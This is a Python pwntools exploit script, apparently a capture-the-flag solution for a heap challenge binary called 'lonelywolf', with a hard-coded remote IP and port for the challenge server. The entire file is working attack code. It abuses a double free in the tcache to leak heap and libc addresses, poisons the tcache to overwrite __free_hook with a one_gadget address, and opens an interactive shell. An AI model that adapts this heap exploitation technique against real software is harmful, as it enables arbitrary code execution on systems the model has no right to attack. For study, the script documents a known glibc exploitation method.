
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
debug = 1
context(arch='amd64', endian='el', os='linux')
context.log_level = 'debug'
if debug == 1:
    p = process(['./lonelywolf'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('52.152.231.198', 8081)
    libc = ELF('./libc-2.27.so', checksec=False)
elf = ELF('./lonelywolf', checksec=False)
libc_one = [0x4f3d5, 0x4f432, 0xe5617, 0xe561e, 0xe5622, 0x10a41c, 0x10a428]

def add(size):
    p.sendlineafter("Your choice: ","1")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Size: ",str(size)) #<0x78

def edit(content):
    p.sendlineafter("Your choice: ","2")
    p.sendlineafter("Index: ",str(0))
    p.sendlineafter("Content: ",content)
    
def show():
    p.sendlineafter("Your choice: ","3")
    p.sendlineafter("Index: ",str(0))
    p.recvuntil("Content: ")

def free():
    p.sendlineafter("Your choice: ","4")
    p.sendlineafter("Index: ",str(0))

add(0x50)
free()

edit(p64(0)*2)
free()
show()
heapbase = u64(p.recv(6).ljust(8,"\x00")) - 0x260
gdb.attach(p,'b *$rebase(0x000927)\n')
add(0x50)
add(0x50)

#add(0x50)
free()

add(0x40)

p.sendlineafter("Your choice: ","1")

p.sendlineafter("Index: ", '1' * 0x410)

add(0x10)
add(0x50)
show()
libc.address = u64(p.recv(6).ljust(8,"\x00")) - 176 - 0x10 - libc.sym['__malloc_hook']
success("heapbase     = " + hex(heapbase))
success("libc.address = " + hex(libc.address))
add(0x60)
free()
edit(p64(0)*2)
free()
add(0x60)
edit(p64(libc.sym['__free_hook']))
add(0x60)
add(0x60)
edit(p64(libc.address + libc_one[5]))
free()
p.interactive()



